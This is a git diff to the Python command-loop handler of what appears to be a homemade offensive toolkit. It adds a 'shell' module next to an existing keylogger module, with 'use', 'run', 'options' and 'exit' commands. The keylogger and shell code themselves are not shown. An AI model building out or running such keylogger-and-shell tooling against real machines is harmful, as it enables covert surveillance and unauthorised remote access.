@@ -1,4 +1,6 @@
 import logger
+import shell
+import sys
 
 # TODO separate the handler's args from the keylogger args
 # 1. Imlement OS commands/ shell module
@@ -7,28 +9,36 @@ class Handler:
     def __init__(self, args):
         self.args = args
         self.module = ""
-        self.logger = None
+        self.module_str = ""
 
     def start(self):
         while True:
-            command = str(input(f"{self.module} >> "))
+            command = str(input(f"{self.module_str} >> "))
             self.handle_command(command)
 
     # bad code :)
     def handle_command(self, command):
         if command[0:3] == "USE" or command[0:3] == "use":
-            self.module = command[4:]
+            module = command[4:]
+            if module == "logger":
+                self.module = logger.Keylogger(self.args)
+                self.module_str = "logger"
+            elif module == "shell":
+                self.module = shell.Shell(self.args)
+                self.module_str = "shell"
             return
 
         if command == "help":
             self.print_help()
             return
 
-        if self.module == "logger":
-            if self.logger is None:
-                self.logger = logger.Keylogger(self.args)
+        if type(self.module) == logger.Keylogger:
             if command == "start" or command == "run":
-                self.logger.start()
+                self.module.start()
+
+        if type(self.module) == shell.Shell:
+            if command == "start" or command == "run":
+                self.module.start()
 
         if command == "options":
             if self.module == "":
@@ -36,10 +46,13 @@ class Handler:
                 return
             cmd_array = command.split(' ')
             if len(cmd_array) > 1 and cmd_array[1] == "set":
-                self.logger.update_options(cmd_array[2], cmd_array[3])
+                self.module.update_options(cmd_array[2], cmd_array[3])
             else:
-                self.logger.print_options()
+                self.module.print_options()
             return
+
+        if command == "exit" or command == "quit":
+            sys.exit(0)
 
     def print_help(self):
         help_payload = ""
